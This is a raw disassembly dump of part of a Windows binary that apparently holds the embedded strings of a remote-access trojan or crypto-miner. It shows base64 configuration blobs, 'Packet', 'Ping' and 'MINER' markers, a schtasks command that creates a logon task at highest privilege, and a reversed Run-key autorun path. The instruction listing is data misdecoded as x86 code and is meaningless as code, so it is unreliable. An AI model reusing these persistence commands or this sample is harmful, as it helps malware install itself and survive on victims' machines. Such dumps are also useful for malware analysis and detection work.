  40b899:	38 00                	cmp    %al,(%eax)
  40b89b:	54                   	push   %esp
  40b89c:	00 77 00             	add    %dh,0x0(%edi)
  40b89f:	62 00                	bound  %eax,(%eax)
  40b8a1:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40b8a5:	54                   	push   %esp
  40b8a6:	00 32                	add    %dh,(%edx)
  40b8a8:	00 55 00             	add    %dl,0x0(%ebp)
  40b8ab:	72 00                	jb     0x40b8ad
  40b8ad:	45                   	inc    %ebp
  40b8ae:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40b8b2:	00 31                	add    %dh,(%ecx)
  40b8b4:	00 72 00             	add    %dh,0x0(%edx)
  40b8b7:	47                   	inc    %edi
  40b8b8:	00 31                	add    %dh,(%ecx)
  40b8ba:	00 37                	add    %dh,(%edi)
  40b8bc:	00 55 00             	add    %dl,0x0(%ebp)
  40b8bf:	61                   	popa
  40b8c0:	00 61 00             	add    %ah,0x0(%ecx)
  40b8c3:	58                   	pop    %eax
  40b8c4:	00 38                	add    %bh,(%eax)
  40b8c6:	00 33                	add    %dh,(%ebx)
  40b8c8:	00 4f 00             	add    %cl,0x0(%edi)
  40b8cb:	41                   	inc    %ecx
  40b8cc:	00 39                	add    %bh,(%ecx)
  40b8ce:	00 47 00             	add    %al,0x0(%edi)
  40b8d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d2:	00 76 00             	add    %dh,0x0(%esi)
  40b8d5:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40b8d9:	2f                   	das
  40b8da:	00 6a 00             	add    %ch,0x0(%edx)
  40b8dd:	75 00                	jne    0x40b8df
  40b8df:	32 00                	xor    (%eax),%al
  40b8e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e2:	00 6c 00 30          	add    %ch,0x30(%eax,%eax,1)
  40b8e6:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b8ea:	00 53 00             	add    %dl,0x0(%ebx)
  40b8ed:	61                   	popa
  40b8ee:	00 46 00             	add    %al,0x0(%esi)
  40b8f1:	77 00                	ja     0x40b8f3
  40b8f3:	43                   	inc    %ebx
  40b8f4:	00 70 00             	add    %dh,0x0(%eax)
  40b8f7:	56                   	push   %esi
  40b8f8:	00 69 00             	add    %ch,0x0(%ecx)
  40b8fb:	76 00                	jbe    0x40b8fd
  40b8fd:	38 00                	cmp    %al,(%eax)
  40b8ff:	6e                   	outsb  %ds:(%esi),(%dx)
  40b900:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40b904:	00 36                	add    %dh,(%esi)
  40b906:	00 55 00             	add    %dl,0x0(%ebp)
  40b909:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40b90d:	74 00                	je     0x40b90f
  40b90f:	47                   	inc    %edi
  40b910:	00 78 00             	add    %bh,0x0(%eax)
  40b913:	63 00                	arpl   %eax,(%eax)
  40b915:	57                   	push   %edi
  40b916:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40b91a:	00 72 00             	add    %dh,0x0(%edx)
  40b91d:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40b921:	72 00                	jb     0x40b923
  40b923:	78 00                	js     0x40b925
  40b925:	34 00                	xor    $0x0,%al
  40b927:	6a 00                	push   $0x0
  40b929:	55                   	push   %ebp
  40b92a:	00 7a 00             	add    %bh,0x0(%edx)
  40b92d:	79 00                	jns    0x40b92f
  40b92f:	36 00 33             	add    %dh,%ss:(%ebx)
  40b932:	00 50 00             	add    %dl,0x0(%eax)
  40b935:	55                   	push   %ebp
  40b936:	00 72 00             	add    %dh,0x0(%edx)
  40b939:	74 00                	je     0x40b93b
  40b93b:	51                   	push   %ecx
  40b93c:	00 4f 00             	add    %cl,0x0(%edi)
  40b93f:	7a 00                	jp     0x40b941
  40b941:	50                   	push   %eax
  40b942:	00 4f 00             	add    %cl,0x0(%edi)
  40b945:	31 00                	xor    %eax,(%eax)
  40b947:	5a                   	pop    %edx
  40b948:	00 55 00             	add    %dl,0x0(%ebp)
  40b94b:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40b94f:	31 00                	xor    %eax,(%eax)
  40b951:	67 00 64 00          	add    %ah,0x0(%si)
  40b955:	43                   	inc    %ebx
  40b956:	00 47 00             	add    %al,0x0(%edi)
  40b959:	31 00                	xor    %eax,(%eax)
  40b95b:	49                   	dec    %ecx
  40b95c:	00 53 00             	add    %dl,0x0(%ebx)
  40b95f:	54                   	push   %esp
  40b960:	00 72 00             	add    %dh,0x0(%edx)
  40b963:	55                   	push   %ebp
  40b964:	00 45 00             	add    %al,0x0(%ebp)
  40b967:	6c                   	insb   (%dx),%es:(%edi)
  40b968:	00 45 00             	add    %al,0x0(%ebp)
  40b96b:	53                   	push   %ebx
  40b96c:	00 5a 00             	add    %bl,0x0(%edx)
  40b96f:	46                   	inc    %esi
  40b970:	00 2b                	add    %ch,(%ebx)
  40b972:	00 73 00             	add    %dh,0x0(%ebx)
  40b975:	34 00                	xor    $0x0,%al
  40b977:	54                   	push   %esp
  40b978:	00 59 00             	add    %bl,0x0(%ecx)
  40b97b:	55                   	push   %ebp
  40b97c:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40b980:	00 73 00             	add    %dh,0x0(%ebx)
  40b983:	76 00                	jbe    0x40b985
  40b985:	6b 00 68             	imul   $0x68,(%eax),%eax
  40b988:	00 55 00             	add    %dl,0x0(%ebp)
  40b98b:	6d                   	insl   (%dx),%es:(%edi)
  40b98c:	00 72 00             	add    %dh,0x0(%edx)
  40b98f:	75 00                	jne    0x40b991
  40b991:	59                   	pop    %ecx
  40b992:	00 4f 00             	add    %cl,0x0(%edi)
  40b995:	59                   	pop    %ecx
  40b996:	00 48 00             	add    %cl,0x0(%eax)
  40b999:	6d                   	insl   (%dx),%es:(%edi)
  40b99a:	00 68 00             	add    %ch,0x0(%eax)
  40b99d:	43                   	inc    %ebx
  40b99e:	00 77 00             	add    %dh,0x0(%edi)
  40b9a1:	79 00                	jns    0x40b9a3
  40b9a3:	2f                   	das
  40b9a4:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40b9a8:	00 6e 00             	add    %ch,0x0(%esi)
  40b9ab:	4b                   	dec    %ebx
  40b9ac:	00 7a 00             	add    %bh,0x0(%edx)
  40b9af:	32 00                	xor    (%eax),%al
  40b9b1:	42                   	inc    %edx
  40b9b2:	00 5a 00             	add    %bl,0x0(%edx)
  40b9b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9b6:	00 47 00             	add    %al,0x0(%edi)
  40b9b9:	6c                   	insb   (%dx),%es:(%edi)
  40b9ba:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40b9be:	00 35 00 70 00 52    	add    %dh,0x52007000
  40b9c4:	00 62 00             	add    %ah,0x0(%edx)
  40b9c7:	36 00 37             	add    %dh,%ss:(%edi)
  40b9ca:	00 5a 00             	add    %bl,0x0(%edx)
  40b9cd:	69 00 57 00 4c 00    	imul   $0x4c0057,(%eax),%eax
  40b9d3:	72 00                	jb     0x40b9d5
  40b9d5:	79 00                	jns    0x40b9d7
  40b9d7:	48                   	dec    %eax
  40b9d8:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  40b9dc:	00 30                	add    %dh,(%eax)
  40b9de:	00 31                	add    %dh,(%ecx)
  40b9e0:	00 72 00             	add    %dh,0x0(%edx)
  40b9e3:	2b 00                	sub    (%eax),%eax
  40b9e5:	52                   	push   %edx
  40b9e6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b9e9:	4a                   	dec    %edx
  40b9ea:	00 68 00             	add    %ch,0x0(%eax)
  40b9ed:	37                   	aaa
  40b9ee:	00 62 00             	add    %ah,0x0(%edx)
  40b9f1:	55                   	push   %ebp
  40b9f2:	00 31                	add    %dh,(%ecx)
  40b9f4:	00 57 00             	add    %dl,0x0(%edi)
  40b9f7:	70 00                	jo     0x40b9f9
  40b9f9:	59                   	pop    %ecx
  40b9fa:	00 39                	add    %bh,(%ecx)
  40b9fc:	00 5a 00             	add    %bl,0x0(%edx)
  40b9ff:	53                   	push   %ebx
  40ba00:	00 41 00             	add    %al,0x0(%ecx)
  40ba03:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40ba08:	80 b1 37 00 4c 00 53 	xorb   $0x53,0x4c0037(%ecx)
  40ba0f:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40ba13:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40ba17:	00 32                	add    %dh,(%edx)
  40ba19:	00 6f 00             	add    %ch,0x0(%edi)
  40ba1c:	54                   	push   %esp
  40ba1d:	00 58 00             	add    %bl,0x0(%eax)
  40ba20:	56                   	push   %esi
  40ba21:	00 49 00             	add    %cl,0x0(%ecx)
  40ba24:	2f                   	das
  40ba25:	00 76 00             	add    %dh,0x0(%esi)
  40ba28:	37                   	aaa
  40ba29:	00 31                	add    %dh,(%ecx)
  40ba2b:	00 57 00             	add    %dl,0x0(%edi)
  40ba2e:	51                   	push   %ecx
  40ba2f:	00 55 00             	add    %dl,0x0(%ebp)
  40ba32:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba33:	00 63 00             	add    %ah,0x0(%ebx)
  40ba36:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba37:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40ba3b:	00 67 00             	add    %ah,0x0(%edi)
  40ba3e:	61                   	popa
  40ba3f:	00 38                	add    %bh,(%eax)
  40ba41:	00 37                	add    %dh,(%edi)
  40ba43:	00 52 00             	add    %dl,0x0(%edx)
  40ba46:	77 00                	ja     0x40ba48
  40ba48:	76 00                	jbe    0x40ba4a
  40ba4a:	77 00                	ja     0x40ba4c
  40ba4c:	45                   	inc    %ebp
  40ba4d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba50:	70 00                	jo     0x40ba52
  40ba52:	57                   	push   %edi
  40ba53:	00 30                	add    %dh,(%eax)
  40ba55:	00 65 00             	add    %ah,0x0(%ebp)
  40ba58:	5a                   	pop    %edx
  40ba59:	00 65 00             	add    %ah,0x0(%ebp)
  40ba5c:	4a                   	dec    %edx
  40ba5d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba60:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba61:	00 79 00             	add    %bh,0x0(%ecx)
  40ba64:	71 00                	jno    0x40ba66
  40ba66:	6b 00 58             	imul   $0x58,(%eax),%eax
  40ba69:	00 68 00             	add    %ch,0x0(%eax)
  40ba6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba6d:	00 33                	add    %dh,(%ebx)
  40ba6f:	00 6e 00             	add    %ch,0x0(%esi)
  40ba72:	61                   	popa
  40ba73:	00 45 00             	add    %al,0x0(%ebp)
  40ba76:	78 00                	js     0x40ba78
  40ba78:	74 00                	je     0x40ba7a
  40ba7a:	38 00                	cmp    %al,(%eax)
  40ba7c:	5a                   	pop    %edx
  40ba7d:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40ba81:	00 47 00             	add    %al,0x0(%edi)
  40ba84:	45                   	inc    %ebp
  40ba85:	00 46 00             	add    %al,0x0(%esi)
  40ba88:	30 00                	xor    %al,(%eax)
  40ba8a:	77 00                	ja     0x40ba8c
  40ba8c:	55                   	push   %ebp
  40ba8d:	00 70 00             	add    %dh,0x0(%eax)
  40ba90:	46                   	inc    %esi
  40ba91:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40ba95:	00 37                	add    %dh,(%edi)
  40ba97:	00 67 00             	add    %ah,0x0(%edi)
  40ba9a:	75 00                	jne    0x40ba9c
  40ba9c:	34 00                	xor    $0x0,%al
  40ba9e:	44                   	inc    %esp
  40ba9f:	00 46 00             	add    %al,0x0(%esi)
  40baa2:	4d                   	dec    %ebp
  40baa3:	00 65 00             	add    %ah,0x0(%ebp)
  40baa6:	44                   	inc    %esp
  40baa7:	00 7a 00             	add    %bh,0x0(%edx)
  40baaa:	32 00                	xor    (%eax),%al
  40baac:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40bab0:	52                   	push   %edx
  40bab1:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40bab5:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40babb:	80 b1 35 00 51 00 4a 	xorb   $0x4a,0x510035(%ecx)
  40bac2:	00 4f 00             	add    %cl,0x0(%edi)
  40bac5:	7a 00                	jp     0x40bac7
  40bac7:	4e                   	dec    %esi
  40bac8:	00 6d 00             	add    %ch,0x0(%ebp)
  40bacb:	37                   	aaa
  40bacc:	00 56 00             	add    %dl,0x0(%esi)
  40bacf:	38 00                	cmp    %al,(%eax)
  40bad1:	7a 00                	jp     0x40bad3
  40bad3:	73 00                	jae    0x40bad5
  40bad5:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40bad9:	72 00                	jb     0x40badb
  40badb:	5a                   	pop    %edx
  40badc:	00 63 00             	add    %ah,0x0(%ebx)
  40badf:	77 00                	ja     0x40bae1
  40bae1:	6d                   	insl   (%dx),%es:(%edi)
  40bae2:	00 72 00             	add    %dh,0x0(%edx)
  40bae5:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40bae9:	79 00                	jns    0x40baeb
  40baeb:	72 00                	jb     0x40baed
  40baed:	47                   	inc    %edi
  40baee:	00 79 00             	add    %bh,0x0(%ecx)
  40baf1:	46                   	inc    %esi
  40baf2:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40baf6:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40bafa:	00 36                	add    %dh,(%esi)
  40bafc:	00 55 00             	add    %dl,0x0(%ebp)
  40baff:	4a                   	dec    %edx
  40bb00:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40bb04:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40bb08:	00 66 00             	add    %ah,0x0(%esi)
  40bb0b:	2f                   	das
  40bb0c:	00 6f 00             	add    %ch,0x0(%edi)
  40bb0f:	4c                   	dec    %esp
  40bb10:	00 38                	add    %bh,(%eax)
  40bb12:	00 4a 00             	add    %cl,0x0(%edx)
  40bb15:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb16:	00 57 00             	add    %dl,0x0(%edi)
  40bb19:	46                   	inc    %esi
  40bb1a:	00 70 00             	add    %dh,0x0(%eax)
  40bb1d:	63 00                	arpl   %eax,(%eax)
  40bb1f:	68 00 78 00 2f       	push   $0x2f007800
  40bb24:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40bb28:	00 2f                	add    %ch,(%edi)
  40bb2a:	00 71 00             	add    %dh,0x0(%ecx)
  40bb2d:	42                   	inc    %edx
  40bb2e:	00 58 00             	add    %bl,0x0(%eax)
  40bb31:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb32:	00 77 00             	add    %dh,0x0(%edi)
  40bb35:	63 00                	arpl   %eax,(%eax)
  40bb37:	54                   	push   %esp
  40bb38:	00 65 00             	add    %ah,0x0(%ebp)
  40bb3b:	75 00                	jne    0x40bb3d
  40bb3d:	59                   	pop    %ecx
  40bb3e:	00 79 00             	add    %bh,0x0(%ecx)
  40bb41:	55                   	push   %ebp
  40bb42:	00 2b                	add    %ch,(%ebx)
  40bb44:	00 38                	add    %bh,(%eax)
  40bb46:	00 36                	add    %dh,(%esi)
  40bb48:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40bb4c:	00 70 00             	add    %dh,0x0(%eax)
  40bb4f:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40bb53:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb54:	00 37                	add    %dh,(%edi)
  40bb56:	00 73 00             	add    %dh,0x0(%ebx)
  40bb59:	32 00                	xor    (%eax),%al
  40bb5b:	63 00                	arpl   %eax,(%eax)
  40bb5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb5e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb61:	4a                   	dec    %edx
  40bb62:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40bb66:	00 51 00             	add    %dl,0x0(%ecx)
  40bb69:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bb6e:	80 b1 6d 00 6f 00 6f 	xorb   $0x6f,0x6f006d(%ecx)
  40bb75:	00 52 00             	add    %dl,0x0(%edx)
  40bb78:	37                   	aaa
  40bb79:	00 75 00             	add    %dh,0x0(%ebp)
  40bb7c:	34 00                	xor    $0x0,%al
  40bb7e:	53                   	push   %ebx
  40bb7f:	00 73 00             	add    %dh,0x0(%ebx)
  40bb82:	7a 00                	jp     0x40bb84
  40bb84:	74 00                	je     0x40bb86
  40bb86:	72 00                	jb     0x40bb88
  40bb88:	62 00                	bound  %eax,(%eax)
  40bb8a:	4a                   	dec    %edx
  40bb8b:	00 6e 00             	add    %ch,0x0(%esi)
  40bb8e:	44                   	inc    %esp
  40bb8f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb92:	48                   	dec    %eax
  40bb93:	00 48 00             	add    %cl,0x0(%eax)
  40bb96:	4a                   	dec    %edx
  40bb97:	00 66 00             	add    %ah,0x0(%esi)
  40bb9a:	53                   	push   %ebx
  40bb9b:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40bb9f:	00 52 00             	add    %dl,0x0(%edx)
  40bba2:	58                   	pop    %eax
  40bba3:	00 7a 00             	add    %bh,0x0(%edx)
  40bba6:	33 00                	xor    (%eax),%eax
  40bba8:	71 00                	jno    0x40bbaa
  40bbaa:	48                   	dec    %eax
  40bbab:	00 41 00             	add    %al,0x0(%ecx)
  40bbae:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40bbb2:	2f                   	das
  40bbb3:	00 4e 00             	add    %cl,0x0(%esi)
  40bbb6:	7a 00                	jp     0x40bbb8
  40bbb8:	4a                   	dec    %edx
  40bbb9:	00 4b 00             	add    %cl,0x0(%ebx)
  40bbbc:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40bbbf:	00 4e 00             	add    %cl,0x0(%esi)
  40bbc2:	68 00 74 00 49       	push   $0x49007400
  40bbc7:	00 6a 00             	add    %ch,0x0(%edx)
  40bbca:	6b 00 77             	imul   $0x77,(%eax),%eax
  40bbcd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bbd0:	6c                   	insb   (%dx),%es:(%edi)
  40bbd1:	00 75 00             	add    %dh,0x0(%ebp)
  40bbd4:	47                   	inc    %edi
  40bbd5:	00 46 00             	add    %al,0x0(%esi)
  40bbd8:	4c                   	dec    %esp
  40bbd9:	00 2b                	add    %ch,(%ebx)
  40bbdb:	00 73 00             	add    %dh,0x0(%ebx)
  40bbde:	45                   	inc    %ebp
  40bbdf:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbe2:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40bbe5:	00 33                	add    %dh,(%ebx)
  40bbe7:	00 65 00             	add    %ah,0x0(%ebp)
  40bbea:	4c                   	dec    %esp
  40bbeb:	00 47 00             	add    %al,0x0(%edi)
  40bbee:	51                   	push   %ecx
  40bbef:	00 56 00             	add    %dl,0x0(%esi)
  40bbf2:	47                   	inc    %edi
  40bbf3:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40bbf7:	00 31                	add    %dh,(%ecx)
  40bbf9:	00 6a 00             	add    %ch,0x0(%edx)
  40bbfc:	55                   	push   %ebp
  40bbfd:	00 2b                	add    %ch,(%ebx)
  40bbff:	00 49 00             	add    %cl,0x0(%ecx)
  40bc02:	4b                   	dec    %ebx
  40bc03:	00 76 00             	add    %dh,0x0(%esi)
  40bc06:	6c                   	insb   (%dx),%es:(%edi)
  40bc07:	00 51 00             	add    %dl,0x0(%ecx)
  40bc0a:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40bc0e:	30 00                	xor    %al,(%eax)
  40bc10:	41                   	inc    %ecx
  40bc11:	00 68 00             	add    %ch,0x0(%eax)
  40bc14:	52                   	push   %edx
  40bc15:	00 49 00             	add    %cl,0x0(%ecx)
  40bc18:	52                   	push   %edx
  40bc19:	00 77 00             	add    %dh,0x0(%edi)
  40bc1c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bc21:	01 00                	add    %eax,(%eax)
  40bc23:	03 33                	add    (%ebx),%esi
  40bc25:	00 00                	add    %al,(%eax)
  40bc27:	09 6e 00             	or     %ebp,0x0(%esi)
  40bc2a:	75 00                	jne    0x40bc2c
  40bc2c:	6c                   	insb   (%dx),%es:(%edi)
  40bc2d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bc31:	03 3a                	add    (%edx),%edi
  40bc33:	00 00                	add    %al,(%eax)
  40bc35:	0d 50 00 61 00       	or     $0x610050,%eax
  40bc3a:	63 00                	arpl   %eax,(%eax)
  40bc3c:	6b 00 65             	imul   $0x65,(%eax),%eax
  40bc3f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bc43:	09 50 00             	or     %edx,0x0(%eax)
  40bc46:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bc4c:	00 0f                	add    %cl,(%edi)
  40bc4e:	4d                   	dec    %ebp
  40bc4f:	00 65 00             	add    %ah,0x0(%ebp)
  40bc52:	73 00                	jae    0x40bc54
  40bc54:	73 00                	jae    0x40bc56
  40bc56:	61                   	popa
  40bc57:	00 67 00             	add    %ah,0x0(%edi)
  40bc5a:	65 00 00             	add    %al,%gs:(%eax)
  40bc5d:	0d 4d 00 49 00       	or     $0x49004d,%eax
  40bc62:	4e                   	dec    %esi
  40bc63:	00 45 00             	add    %al,0x0(%ebp)
  40bc66:	52                   	push   %edx
  40bc67:	00 20                	add    %ah,(%eax)
  40bc69:	00 00                	add    %al,(%eax)
  40bc6b:	03 30                	add    (%eax),%esi
  40bc6d:	00 00                	add    %al,(%eax)
  40bc6f:	0f 7b                	(bad)
  40bc71:	00 30                	add    %dh,(%eax)
  40bc73:	00 3a                	add    %bh,(%edx)
  40bc75:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40bc79:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc7c:	20 00                	and    %al,(%eax)
  40bc7e:	00 0f                	add    %cl,(%edi)
  40bc80:	7b 00                	jnp    0x40bc82
  40bc82:	30 00                	xor    %al,(%eax)
  40bc84:	3a 00                	cmp    (%eax),%al
  40bc86:	58                   	pop    %eax
  40bc87:	00 32                	add    %dh,(%edx)
  40bc89:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc8c:	20 00                	and    %al,(%eax)
  40bc8e:	00 2b                	add    %ch,(%ebx)
  40bc90:	28 00                	sub    %al,(%eax)
  40bc92:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc93:	00 65 00             	add    %ah,0x0(%ebp)
  40bc96:	76 00                	jbe    0x40bc98
  40bc98:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc9c:	20 00                	and    %al,(%eax)
  40bc9e:	75 00                	jne    0x40bca0
  40bca0:	73 00                	jae    0x40bca2
  40bca2:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bca7:	00 20                	add    %ah,(%eax)
  40bca9:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bcad:	00 70 00             	add    %dh,0x0(%eax)
  40bcb0:	65 00 20             	add    %ah,%gs:(%eax)
  40bcb3:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bcb6:	63 00                	arpl   %eax,(%eax)
  40bcb8:	31 00                	xor    %eax,(%eax)
  40bcba:	00 45 28             	add    %al,0x28(%ebp)
  40bcbd:	00 65 00             	add    %ah,0x0(%ebp)
  40bcc0:	78 00                	js     0x40bcc2
  40bcc2:	74 00                	je     0x40bcc4
  40bcc4:	38 00                	cmp    %al,(%eax)
  40bcc6:	2c 00                	sub    $0x0,%al
  40bcc8:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bccc:	74 00                	je     0x40bcce
  40bcce:	31 00                	xor    %eax,(%eax)
  40bcd0:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bcd4:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bcd8:	33 00                	xor    (%eax),%eax
  40bcda:	32 00                	xor    (%eax),%al
  40bcdc:	29 00                	sub    %eax,(%eax)
  40bcde:	20 00                	and    %al,(%eax)
  40bce0:	74 00                	je     0x40bce2
  40bce2:	79 00                	jns    0x40bce4
  40bce4:	70 00                	jo     0x40bce6
  40bce6:	65 00 20             	add    %ah,%gs:(%eax)
  40bce9:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bcec:	63 00                	arpl   %eax,(%eax)
  40bcee:	37                   	aaa
  40bcef:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bcf2:	24 00                	and    $0x0,%al
  40bcf4:	63 00                	arpl   %eax,(%eax)
  40bcf6:	38 00                	cmp    %al,(%eax)
  40bcf8:	2c 00                	sub    $0x0,%al
  40bcfa:	24 00                	and    $0x0,%al
  40bcfc:	63 00                	arpl   %eax,(%eax)
  40bcfe:	39 00                	cmp    %eax,(%eax)
  40bd00:	00 19                	add    %bl,(%ecx)
  40bd02:	73 00                	jae    0x40bd04
  40bd04:	63 00                	arpl   %eax,(%eax)
  40bd06:	68 00 74 00 61       	push   $0x61007400
  40bd0b:	00 73 00             	add    %dh,0x0(%ebx)
  40bd0e:	6b 00 73             	imul   $0x73,(%eax),%eax
  40bd11:	00 2e                	add    %ch,(%esi)
  40bd13:	00 65 00             	add    %ah,0x0(%ebp)
  40bd16:	78 00                	js     0x40bd18
  40bd18:	65 00 00             	add    %al,%gs:(%eax)
  40bd1b:	53                   	push   %ebx
  40bd1c:	2f                   	das
  40bd1d:	00 63 00             	add    %ah,0x0(%ebx)
  40bd20:	72 00                	jb     0x40bd22
  40bd22:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bd26:	74 00                	je     0x40bd28
  40bd28:	65 00 20             	add    %ah,%gs:(%eax)
  40bd2b:	00 2f                	add    %ch,(%edi)
  40bd2d:	00 66 00             	add    %ah,0x0(%esi)
  40bd30:	20 00                	and    %al,(%eax)
  40bd32:	2f                   	das
  40bd33:	00 73 00             	add    %dh,0x0(%ebx)
  40bd36:	63 00                	arpl   %eax,(%eax)
  40bd38:	20 00                	and    %al,(%eax)
  40bd3a:	4f                   	dec    %edi
  40bd3b:	00 4e 00             	add    %cl,0x0(%esi)
  40bd3e:	4c                   	dec    %esp
  40bd3f:	00 4f 00             	add    %cl,0x0(%edi)
  40bd42:	47                   	inc    %edi
  40bd43:	00 4f 00             	add    %cl,0x0(%edi)
  40bd46:	4e                   	dec    %esi
  40bd47:	00 20                	add    %ah,(%eax)
  40bd49:	00 2f                	add    %ch,(%edi)
  40bd4b:	00 52 00             	add    %dl,0x0(%edx)
  40bd4e:	4c                   	dec    %esp
  40bd4f:	00 20                	add    %ah,(%eax)
  40bd51:	00 48 00             	add    %cl,0x0(%eax)
  40bd54:	49                   	dec    %ecx
  40bd55:	00 47 00             	add    %al,0x0(%edi)
  40bd58:	48                   	dec    %eax
  40bd59:	00 45 00             	add    %al,0x0(%ebp)
  40bd5c:	53                   	push   %ebx
  40bd5d:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bd61:	00 2f                	add    %ch,(%edi)
  40bd63:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40bd67:	00 20                	add    %ah,(%eax)
  40bd69:	00 22                	add    %ah,(%edx)
  40bd6b:	00 27                	add    %ah,(%edi)
  40bd6d:	00 01                	add    %al,(%ecx)
  40bd6f:	13 22                	adc    (%edx),%esp
  40bd71:	00 27                	add    %ah,(%edi)
  40bd73:	00 20                	add    %ah,(%eax)
  40bd75:	00 2f                	add    %ch,(%edi)
  40bd77:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40bd7b:	00 20                	add    %ah,(%eax)
  40bd7d:	00 22                	add    %ah,(%edx)
  40bd7f:	00 27                	add    %ah,(%edi)
  40bd81:	00 01                	add    %al,(%ecx)
  40bd83:	05 22 00 27 00       	add    $0x270022,%eax
  40bd88:	01 5d 5c             	add    %ebx,0x5c(%ebp)
  40bd8b:	00 6e 00             	add    %ch,0x0(%esi)
  40bd8e:	75 00                	jne    0x40bd90
  40bd90:	52                   	push   %edx
  40bd91:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40bd95:	00 6f 00             	add    %ch,0x0(%edi)
  40bd98:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40bd9e:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40bda2:	74 00                	je     0x40bda4
  40bda4:	6e                   	outsb  %ds:(%esi),(%dx)
  40bda5:	00 65 00             	add    %ah,0x0(%ebp)
  40bda8:	72 00                	jb     0x40bdaa
  40bdaa:	72 00                	jb     0x40bdac
  40bdac:	75 00                	jne    0x40bdae
  40bdae:	43                   	inc    %ebx
  40bdaf:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40bdb3:	00 77 00             	add    %dh,0x0(%edi)
  40bdb6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdb7:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40bdbb:	00 69 00             	add    %ch,0x0(%ecx)
  40bdbe:	57                   	push   %edi
  40bdbf:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40bdc3:	00 66 00             	add    %ah,0x0(%esi)
  40bdc6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdc7:	00 73 00             	add    %dh,0x0(%ebx)
  40bdca:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdcb:	00 72 00             	add    %dh,0x0(%edx)
